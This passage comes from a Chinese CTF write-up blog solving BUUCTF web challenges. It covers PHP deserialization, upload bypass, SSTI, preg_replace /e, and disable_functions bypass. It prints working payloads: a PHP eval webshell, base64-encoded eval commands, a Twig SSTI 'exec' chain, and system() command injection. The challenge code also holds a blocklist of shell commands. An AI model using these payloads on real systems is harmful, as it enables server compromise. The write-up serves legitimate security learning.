class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = 0; <span class="variable">$i</span> &lt; strlen(<span class="variable">$s</span>); <span class="variable">$i</span>++)</span><br><span class="line">        <span class="keyword">if</span>(!(ord(<span class="variable">$s</span>[<span class="variable">$i</span>]) &gt;= 32 &amp;&amp; ord(<span class="variable">$s</span>[<span class="variable">$i</span>]) &lt;= 125))</span><br><span class="line">            <span class="built_in">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="built_in">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_GET</span>&#123;<span class="string">'str'</span>&#125;)) &#123;</span><br><span class="line">    <span class="variable">$str</span> = (string)<span class="variable">$_GET</span>[<span class="string">'str'</span>];</span><br><span class="line">    <span class="keyword">if</span>(is_valid(<span class="variable">$str</span>)) &#123;</span><br><span class="line">        <span class="variable">$obj</span> = unserialize(<span class="variable">$str</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>目的是要读取出flag.php中的内容<br>有read和write方法，在read方法中，会读取出filename中的内容，显然我们是要想办法调用read方法<br>在construct方法中，调用了process方法，进入process方法，可以看见如果op==”2”就会去调用read方法，但是在destruct方法中会判断op===”2”,如果成立就会替换为op=”1”,继续调用process时就不能调用read方法了,很明显在destruct中是强类型比较，在process中是弱类型比较，只要使op=2即可绕过destruct方法<br>还有一个函数is_valid,判断是不是可见字符，因为题目中类的成员是protected<br>protected 声明的字段为保护字段，在所声明的类和该类的子类中可见，但在该类的对象实例中不可见。因此保护字段的字段名在序列化时，字段名前面会加上 \0*\0 的前缀，这里的 \0 表示 ASCII 码为 0 的字符，也就是我们经过 urlencode 后看到的 %00 ，所以这无法通过is_valid的过滤<br>这里只需要把protected改为public即可<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class FileHandler &#123;</span><br><span class="line">    public <span class="variable">$op</span> = 2;</span><br><span class="line">    public <span class="variable">$filename</span> = <span class="string">"flag.php"</span>;</span><br><span class="line">    public <span class="variable">$content</span> = <span class="string">""</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=new FileHandler();</span><br><span class="line"><span class="built_in">echo</span> serialize(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure><br>payload<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?str=O:11:<span class="string">"FileHandler"</span>:3:&#123;s:2:<span class="string">"op"</span>;i:2;s:8:<span class="string">"filename"</span>;s:8:<span class="string">"flag.php"</span>;s:7:<span class="string">"content"</span>;s:0:<span class="string">""</span>;&#125;</span><br></pre></td></tr></table></figure><br>在源码中就能发现flag</p>
<h3 id="极客大挑战-2019-Upload"><a href="#极客大挑战-2019-Upload" class="headerlink" title="[极客大挑战 2019]Upload"></a>[极客大挑战 2019]Upload</h3><p>尝试上传包含&lt;?php @eval($_POST[“shell”]);?&gt;的php文件，失败。修改后缀还是不行，burp抓包，修改一下MIME类型image/jpeg，还是不行，继续换后缀，发现phtml时返回了新信息<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/Upload/upload0.jpg" alt=""><br>说明对文件内容进行了过滤，那就不能用php标签了，换成js<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/Upload/upload1.jpg" alt=""><br>上传成功，蚁剑getshell<br>连上后在文件里发现php7、phps等后缀文件均可getshell,师傅们太强了<br>文件太多，不一一寻找flag,直接终端cat /flag</p>
<h3 id="ACTF2020-新生赛-Upload"><a href="#ACTF2020-新生赛-Upload" class="headerlink" title="[ACTF2020 新生赛]Upload"></a>[ACTF2020 新生赛]Upload</h3><p>直接用上一个题的imageUpload.phtml文件上传，成功上传，返回了路径，直接getshell<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/ACTF_Upload/upload_0.jpg" alt=""></p>
<h3 id="GKCTF2020-cve版签到"><a href="#GKCTF2020-cve版签到" class="headerlink" title="[GKCTF2020]cve版签到"></a>[GKCTF2020]cve版签到</h3><p>提示说cve-2020-7066，另一篇文章讲了该漏洞<a href="https://zxfireworks.xyz/2020/07/07/CVE-2020-7066/" target="_blank" rel="noopener">https://zxfireworks.xyz/2020/07/07/CVE-2020-7066/</a><br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/CVE-2020-7066/cve20207066_0.jpg" alt=""><br>点进去后，URL很特别，其他啥也没有<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/CVE-2020-7066/cve20207066_1.jpg" alt=""><br>用bp抓一下包<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/CVE-2020-7066/cve20207066_2.jpg" alt=""><br>提示使用localhost,刚开始还以为是修改X-Forwarded-For呢,测试了一下并不是，那就应该是修改URL中那个特别的参数<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/CVE-2020-7066/cve20207066_3.jpg" alt=""><br>又出现了新提示，Host必须以123结尾，将刚才的url=<a href="http://127.0.0.1修改为url=http://127.0.0.123,并没有什么反应" target="_blank" rel="noopener">http://127.0.0.1修改为url=http://127.0.0.123,并没有什么反应</a><br>文章开头说了，这个题目给了提示，而且在页面中有句话：You just view *.ctfhub.com<br>那是不是要求URL解析后只能为127.0.0.123，且还要get传参中的url是.ctfhub.com结尾，那这就可以利用该漏洞了<br>Payload:?url=<a href="http://127.0.0.123%00www.ctfhub.com">http://127.0.0.123%00www.ctfhub.com</a><br>这里没用\0是因为这是已经解析过了的<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/CVE-2020-7066/cve20207066_4.jpg" alt=""></p>
<h3 id="GKCTF2020-CheckIN"><a href="#GKCTF2020-CheckIN" class="headerlink" title="[GKCTF2020]CheckIN"></a>[GKCTF2020]CheckIN</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">class ClassName</span><br><span class="line">&#123;</span><br><span class="line">        public <span class="variable">$code</span> = null;</span><br><span class="line">        public <span class="variable">$decode</span> = null;</span><br><span class="line">        <span class="keyword">function</span> __construct()</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="variable">$this</span>-&gt;code = @<span class="variable">$this</span>-&gt;x()[<span class="string">'Ginkgo'</span>];</span><br><span class="line">                <span class="variable">$this</span>-&gt;decode = @base64_decode( <span class="variable">$this</span>-&gt;code );</span><br><span class="line">                @<span class="built_in">eval</span>(<span class="variable">$this</span>-&gt;decode);</span><br><span class="line">        &#125;</span><br><span class="line">        public <span class="keyword">function</span> x()</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="built_in">return</span> <span class="variable">$_REQUEST</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">new ClassName();</span><br></pre></td></tr></table></figure>
<p>第一眼看到以为是反序列化，结果没看到unserialize<br>__construct()函数中，code的值是调用x()函数，而x()函数可以请求一个参数Ginkgo,得到的参数在经过base解码后作为eval()函数的参数执行了，eval显然可以利用命令执行，尝试传入一个一句话木马(eval($_POST[“pass”]);)试试，不过这里要先base64编码<br>payload:?Ginkgo=ZXZhbCgkX1BPU1RbInBhc3MiXSk7<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/GKCTF2020_CheckIN/checkin_0.jpg" alt=""><br>用蚁剑连接成功，flag文件打开啥也没有，readflag文件是一堆乱码<br>去看了大佬的wp,说是利用PHP7.3版本的一个漏洞bypass disable_functions，该漏洞利用PHP garbage collector程序中的堆溢出触发命令执行，可影响linux,php7.0-7.3<br>大佬的exp:<a href="https://github.com/mm0r1/exploits/blob/master/php7-gc-bypass/exploit.php" target="_blank" rel="noopener">https://github.com/mm0r1/exploits/blob/master/php7-gc-bypass/exploit.php</a><br>下载后修改一下<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/GKCTF2020_CheckIN/checkin_1.jpg" alt=""><br>在蚁剑里可以发现只有tmp文件夹是有权限写入的，将exp放到tmp里面，上传exp后利用最开始的命令执行来包含exp(include(“/tmp/exploit.php”);)<br>Payload:?Ginkgo=aW5jbHVkZSgiL3RtcC9leHBsb2l0LnBocCIpOw==<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/GKCTF2020_CheckIN/checkin_2.jpg" alt=""></p>
<h3 id="安洵杯-2019-easy-web"><a href="#安洵杯-2019-easy-web" class="headerlink" title="[安洵杯 2019]easy_web"></a>[安洵杯 2019]easy_web</h3><p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/easy_web/easyweb0.jpg" alt=""><br>查看源码，没啥东西，就只有一张图片的base64编码形式。URL中img参数的值很像是base64编码，试着解码,可以解码，解码后的内容还是base64，继续<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">TXpVek5UTTFNbVUzTURabE5qYz0</span><br><span class="line">MzUzNTM1MmU3MDZlNjc=</span><br><span class="line">3535352e706e67</span><br></pre></td></tr></table></figure><br>这串数字是16进制，尝试转换一下，转出来是555.png<br>不难想到，img这个参数是不是可以将指定文件的内容输出出来。尝试输出一下index.php，不过要把index.php先转换为16进制，再进行两次base64编码<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">696E6465782E706870</span><br><span class="line">Njk2RTY0NjU3ODJFNzA2ODcw</span><br><span class="line">TmprMlJUWTBOalUzT0RKRk56QTJPRGN3</span><br></pre></td></tr></table></figure><br>Payload:?img=TmprMlJUWTBOalUzT0RKRk56QTJPRGN3&amp;cmd=<br>结果在原来图片的位置返回了index.php的base64编码，解码后如下<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(E_ALL || ~ E_NOTICE);</span><br><span class="line">header(<span class="string">'content-type:text/html;charset=utf-8'</span>);</span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">'cmd'</span>];</span><br><span class="line"><span class="keyword">if</span> (!isset(<span class="variable">$_GET</span>[<span class="string">'img'</span>]) || !isset(<span class="variable">$_GET</span>[<span class="string">'cmd'</span>])) </span><br><span class="line">    header(<span class="string">'Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd='</span>);</span><br><span class="line"><span class="variable">$file</span> = hex2bin(base64_decode(base64_decode(<span class="variable">$_GET</span>[<span class="string">'img'</span>])));</span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = preg_replace(<span class="string">"/[^a-zA-Z0-9.]+/"</span>, <span class="string">""</span>, <span class="variable">$file</span>);</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">"/flag/i"</span>, <span class="variable">$file</span>)) &#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">'&lt;img src ="./ctf3.jpeg"&gt;'</span>;</span><br><span class="line">    die(<span class="string">"xixi～ no flag"</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$txt</span> = base64_encode(file_get_contents(<span class="variable">$file</span>));</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"&lt;img src='data:image/gif;base64,"</span> . <span class="variable">$txt</span> . <span class="string">"'&gt;&lt;/img&gt;"</span>;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$cmd</span>;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">"/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\'|\"|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i"</span>, <span class="variable">$cmd</span>)) &#123;</span><br><span class="line">    <span class="built_in">echo</span>(<span class="string">"forbid ~"</span>);</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> ((string)<span class="variable">$_POST</span>[<span class="string">'a'</span>] !== (string)<span class="variable">$_POST</span>[<span class="string">'b'</span>] &amp;&amp; md5(<span class="variable">$_POST</span>[<span class="string">'a'</span>]) === md5(<span class="variable">$_POST</span>[<span class="string">'b'</span>])) &#123;</span><br><span class="line">        <span class="built_in">echo</span> `<span class="variable">$cmd</span>`;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">echo</span> (<span class="string">"md5 is funny ~"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><br>可以看到有个flag,但是被过滤了,不过在代码下方发现了很重要的东西<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> `<span class="variable">$cmd</span>`;</span><br></pre></td></tr></table></figure><br>反引号啊，意味着命令执行啊，但是好多系统命令都被过滤了，而且还要绕过md5强类型比较<br>md5强类型比较去网上找了一个大佬的<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&amp;b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</span><br></pre></td></tr></table></figure><br>对于打印文件列表，虽然ls命令被过滤了，但很容易绕过，可用l\s<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/easy_web/easyweb1.jpg" alt=""><br>并没有发现flag,尝试ls一下根目录<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/easy_web/easyweb2.jpg" alt=""><br>发现了flag,现在需要读取flag，cat命令也被过滤了，还是老办法，反斜线绕过<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/easy_web/easyweb3.jpg" alt=""><br>这道题ls也可以用dir命令来代替</p>
<h3 id="ASIS-2019-Unicorn-shop"><a href="#ASIS-2019-Unicorn-shop" class="headerlink" title="[ASIS 2019]Unicorn shop"></a>[ASIS 2019]Unicorn shop</h3><p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/Unicornshop/Unicornshop1.jpg" alt=""><br>尝试买第一个<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/Unicornshop/Unicornshop0.jpg" alt=""><br>说错误的商品，第二个和第三个也是这样，只有买第四个的时候不是这样<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/Unicornshop/Unicornshop2.jpg" alt=""><br>只允许一个字符，额1337四个字符呢，那就需要是一个字符，而且还比1337大的数字，这就涉及Unicode的安全性了<br><a href="https://xz.aliyun.com/t/5402#toc-0" target="_blank" rel="noopener">https://xz.aliyun.com/t/5402#toc-0</a><br>可以在<a href="https://www.compart.com/en/unicode/mirrored这个网站找到我们需要的" target="_blank" rel="noopener">https://www.compart.com/en/unicode/mirrored这个网站找到我们需要的</a><br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/Unicornshop/Unicornshop3.jpg" alt=""><br>这个挺好看，就用这个了,而且5000也够了<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/Unicornshop/Unicornshop4.jpg" alt=""><br>价格处输入：%E2%86%81<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/Unicornshop/Unicornshop5.jpg" alt=""></p>
<h3 id="BJDCTF2020-Mark-loves-cat"><a href="#BJDCTF2020-Mark-loves-cat" class="headerlink" title="[BJDCTF2020]Mark loves cat"></a>[BJDCTF2020]Mark loves cat</h3><p>源码没啥重要的信息，扫了一下目录，发现.git,看来有git源码泄露，GitHack把源码扒下来<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include<span class="string">'flag.php'</span>;</span><br><span class="line"><span class="variable">$yds</span> = <span class="string">"dog"</span>;</span><br><span class="line"><span class="variable">$is</span> = <span class="string">"cat"</span>;</span><br><span class="line"><span class="variable">$handsome</span> = <span class="string">'yds'</span>; //看到这就能想到变量覆盖了</span><br><span class="line">foreach(<span class="variable">$_POST</span> as <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    $<span class="variable">$x</span> = <span class="variable">$y</span>;</span><br><span class="line">&#125;</span><br><span class="line">foreach(<span class="variable">$_GET</span> as <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123; //漏洞点</span><br><span class="line">    $<span class="variable">$x</span> = $<span class="variable">$y</span>;</span><br><span class="line">&#125;</span><br><span class="line">foreach(<span class="variable">$_GET</span> as <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123; </span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">'flag'</span>] === <span class="variable">$x</span> &amp;&amp; <span class="variable">$x</span> !== <span class="string">'flag'</span>)&#123; //get参数的键不能是flag,值还必须是flag</span><br><span class="line">        <span class="built_in">exit</span>(<span class="variable">$handsome</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!isset(<span class="variable">$_GET</span>[<span class="string">'flag'</span>]) &amp;&amp; !isset(<span class="variable">$_POST</span>[<span class="string">'flag'</span>]))&#123; //只要get 或者 post的参数flag就行</span><br><span class="line">    <span class="built_in">exit</span>(<span class="variable">$yds</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">'flag'</span>] === <span class="string">'flag'</span>  || <span class="variable">$_GET</span>[<span class="string">'flag'</span>] === <span class="string">'flag'</span>)&#123; //不论是get 还是 post都不能出现flag=flag</span><br><span class="line">    <span class="built_in">exit</span>(<span class="variable">$is</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"the flag is: "</span>.<span class="variable">$flag</span>;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><br>根据上面的分析，可构造如下Payload:<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">POST: <span class="variable">$flag</span>=flag</span><br><span class="line">GET:  yds=flag</span><br></pre></td></tr></table></figure><br>分析如下：<br>想办法输出$flag<br>第一个foreach语句：<script type="math/tex">flag=$flag,即</script>flag=flag<br>第二个foreach语句：$yds=$flag,这很重要，为下面利用做准备<br>第三个foreach语句中的if语句：没有get一个flag,所以这层过滤直接失效<br>第一个if语句：if条件为假，输出$yds，而此时的$yds=$flag，刚好就是我们要的<br>最后在源码中得到flag</p>
<h3 id="BJDCTF2020-The-mystery-of-ip"><a href="#BJDCTF2020-The-mystery-of-ip" class="headerlink" title="[BJDCTF2020]The mystery of ip"></a>[BJDCTF2020]The mystery of ip</h3><p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/Themysteryofip/ip0.jpg" alt=""><br>能够获取我们的ip<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/Themysteryofip/ip1.jpg" alt=""><br>提示说你知道为什么我知道你的ip吗，第一反应哪里会有命令执行，bp抓个包<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/Themysteryofip/ip2.jpg" alt=""><br>看来不是命令执行，然后扫了一下目录，有个.DS_Store,里面也没啥东西<br>看大佬wp说是有SSTI,啊这。。。，我tcl,之前还专门去看过SSTI,题做得还是太少，总结的太少了，唉<br>先测试一下是不是有SSTI<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/Themysteryofip/ip3.jpg" alt=""><br>还真有，那就先列一下目录<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/Themysteryofip/ip4.jpg" alt=""><br>发现flag,cat一下<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/Themysteryofip/ip5.jpg" alt=""></p>
<h3 id="BJDCTF2020-ZJCTF，不过如此"><a href="#BJDCTF2020-ZJCTF，不过如此" class="headerlink" title="[BJDCTF2020]ZJCTF，不过如此"></a>[BJDCTF2020]ZJCTF，不过如此</h3><p>给了源码<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line"><span class="variable">$text</span> = <span class="variable">$_GET</span>[<span class="string">"text"</span>];</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">"file"</span>];</span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$text</span>)&amp;&amp;(file_get_contents(<span class="variable">$text</span>,<span class="string">'r'</span>)===<span class="string">"I have a dream"</span>))&#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"&lt;br&gt;&lt;h1&gt;"</span>.file_get_contents(<span class="variable">$text</span>,<span class="string">'r'</span>).<span class="string">"&lt;/h1&gt;&lt;/br&gt;"</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/flag/"</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        die(<span class="string">"Not now!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    include(<span class="variable">$file</span>);  //next.php</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><br>get传入text和file，text的内容为I have a dream,file中不能有flag<br>text可用data协议绕过，然后用伪协议读取next.php<br>Payload:<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?text=data://text/plain,I have a dream&amp;file=php://filter/convert.base64-encode/resource=next.php</span><br></pre></td></tr></table></figure><br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/ZJCTFbgrc/ZGCTFbgrc0.jpg" alt=""><br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">'id'</span>];</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">'id'</span>] = <span class="variable">$id</span>;</span><br><span class="line"><span class="keyword">function</span> complex(<span class="variable">$re</span>, <span class="variable">$str</span>) &#123;</span><br><span class="line">    <span class="built_in">return</span> preg_replace(</span><br><span class="line">        <span class="string">'/('</span> . <span class="variable">$re</span> . <span class="string">')/ei'</span>,</span><br><span class="line">        <span class="string">'strtolower("\\1")'</span>,</span><br><span class="line">        <span class="variable">$str</span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line">foreach(<span class="variable">$_GET</span> as <span class="variable">$re</span> =&gt; <span class="variable">$str</span>) &#123;</span><br><span class="line">    <span class="built_in">echo</span> complex(<span class="variable">$re</span>, <span class="variable">$str</span>). <span class="string">"\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">getFlag</span></span>()&#123;</span><br><span class="line">	@<span class="built_in">eval</span>(<span class="variable">$_GET</span>[<span class="string">'cmd'</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>preg_replace()函数/e模式下有命令执行漏洞，这篇文章讲的很详细：<a href="https://xz.aliyun.com/t/2557" target="_blank" rel="noopener">https://xz.aliyun.com/t/2557</a><br>想办法让它调用getFlag()函数，从而在参数cmd中构造命令执行<br>Payload:<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?\S*=<span class="variable">$&#123;getFlag()&#125;</span>&amp;cmd=system(<span class="string">"ls /"</span>);</span><br></pre></td></tr></table></figure><br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/ZJCTFbgrc/ZGCTFbgrc1.jpg" alt=""><br>cat一下<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?\S*=<span class="variable">$&#123;getFlag()&#125;</span>&amp;cmd=system(<span class="string">"cat /flag"</span>);</span><br></pre></td></tr></table></figure><br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/ZJCTFbgrc/ZGCTFbgrc2.jpg" alt=""></p>
<h3 id="BJDCTF2020-Cookie-is-so-stable"><a href="#BJDCTF2020-Cookie-is-so-stable" class="headerlink" title="[BJDCTF2020]Cookie is so stable"></a>[BJDCTF2020]Cookie is so stable</h3><p>和之前[BJDCTF2020]The mystery of ip这道题很像<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/Cookieissostable/Cookieissostable0.jpg" alt=""><br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/Cookieissostable/Cookieissostable1.jpg" alt=""><br>看来这道题关键点在Cookie,bp抓一下包<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/Cookieissostable/Cookieissostable3.jpg" alt=""><br>set-Cookie中有个user=admin,很有可能就是注入点，在Cookie中设置一下user，再发包<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/Cookieissostable/Cookieissostable2.jpg" alt=""><br>测试一下是不是SSTI：49，返回49，则是Twig模板<br>存在SSTI,且是Twig模板<br>Payload:<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(<span class="string">"exec"</span>)&#125;&#125;&#123;&#123;_self.env.getFilter(<span class="string">"cat /flag"</span>)&#125;&#125;</span><br></pre></td></tr></table></figure><br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/Cookieissostable/Cookieissostable4.jpg" alt=""></p>
<h3 id="MRCTF2020-Ez-bypass"><a href="#MRCTF2020-Ez-bypass" class="headerlink" title="[MRCTF2020]Ez_bypass"></a>[MRCTF2020]Ez_bypass</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">I put something <span class="keyword">in</span> F12 <span class="keyword">for</span> you</span><br><span class="line">include <span class="string">'flag.php'</span>;</span><br><span class="line"><span class="variable">$flag</span>=<span class="string">'MRCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxx&#125;'</span>;</span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">'gg'</span>])&amp;&amp;isset(<span class="variable">$_GET</span>[<span class="string">'id'</span>])) &#123;</span><br><span class="line">    <span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">'id'</span>];</span><br><span class="line">    <span class="variable">$gg</span>=<span class="variable">$_GET</span>[<span class="string">'gg'</span>];</span><br><span class="line">    <span class="keyword">if</span> (md5(<span class="variable">$id</span>) === md5(<span class="variable">$gg</span>) &amp;&amp; <span class="variable">$id</span> !== <span class="variable">$gg</span>) &#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">'You got the first step'</span>;</span><br><span class="line">        <span class="keyword">if</span>(isset(<span class="variable">$_POST</span>[<span class="string">'passwd'</span>])) &#123;</span><br><span class="line">            <span class="variable">$passwd</span>=<span class="variable">$_POST</span>[<span class="string">'passwd'</span>];</span><br><span class="line">            <span class="keyword">if</span> (!is_numeric(<span class="variable">$passwd</span>))&#123;</span><br><span class="line">                 <span class="keyword">if</span>(<span class="variable">$passwd</span>==1234567)&#123;</span><br><span class="line">                     <span class="built_in">echo</span> <span class="string">'Good Job!'</span>;</span><br><span class="line">                     highlight_file(<span class="string">'flag.php'</span>);</span><br><span class="line">                     die(<span class="string">'By Retr_0'</span>);</span><br><span class="line">                 &#125;</span><br><span class="line">                 <span class="keyword">else</span>&#123;</span><br><span class="line">                     <span class="built_in">echo</span> <span class="string">"can you think twice??"</span>;</span><br><span class="line">                 &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="built_in">echo</span> <span class="string">'You can not get it !'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            die(<span class="string">'only one way to get the flag'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">"You are not a real hacker!"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    die(<span class="string">'Please input first'</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;You got the first steponly one way to get the flag</span><br></pre></td></tr></table></figure>
